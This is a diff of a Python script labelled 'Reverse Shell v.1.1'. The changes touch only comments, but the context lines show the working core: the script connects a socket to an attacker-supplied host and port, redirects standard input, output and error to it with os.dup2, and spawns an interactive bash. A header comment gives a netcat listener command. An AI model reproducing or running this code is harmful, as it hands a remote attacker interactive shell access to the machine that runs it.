@@ -3,7 +3,7 @@
 # Reverse Shell v.1.1
 # Bug Fixes
 # Tested On - Unix/Linux
-# It Connects to Host & Port given to IT
+# It Connects to Host & Port given to It
 # 
 # Set Listener such as Netcat, Msfconsole or other ones
 # Example nc -lvp 443 
@@ -32,7 +32,7 @@ def Reverse_Shell(r_Server, r_Port):
 		s.connect((r_Server, r_Port)) 
 		os.dup2(s.fileno(),0)
 		os.dup2(s.fileno(),1) 
-		os.dup2(s.fileno(),2)      # Set here different Shell
+		os.dup2(s.fileno(),2)   # Set here different Shell Envirioment
 		shell = subprocess.call(["/bin/bash", "-i"])
 	except Exception, e: # if Connection is Refused by Server
 		print (colored('[!] CONNECTION REFUSED! ','red')) + r_Server 
